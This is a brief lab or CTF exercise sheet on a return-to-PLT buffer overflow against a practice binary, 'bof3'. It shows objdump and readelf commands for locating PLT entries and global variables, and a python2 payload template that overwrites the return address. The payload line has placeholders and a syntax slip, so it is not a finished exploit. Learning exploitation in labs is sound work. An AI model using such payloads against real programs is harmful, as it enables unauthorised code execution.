# Buffer Overflow : return to plt
```
1. TARGET FILE : bof3 <br>
2. SORUCE FILE : bof3.c <br>
```

***TASK1*** 
```
Q.) How to Find plt section in elf file? 
A.) use objdump option with -j ".plt" 

How To) 
objdump -d -M intel -j .plt bof3 
```

***TASK2*** 
```
Q.) How to Find global Variable ? 
A.) user readelf tool with -s 

How To) 
readelf -s bof3 |grep GLOBAL 
```

***TASK3*** 
```
Q.) plt Payloads? 
A.) Command This 

python2 -c "print 'a'*offset '{plt section function address}' \
        +'BBBB'+'{GLOBAL VARIABLE ADDRESS}'" | ./target_file 
```
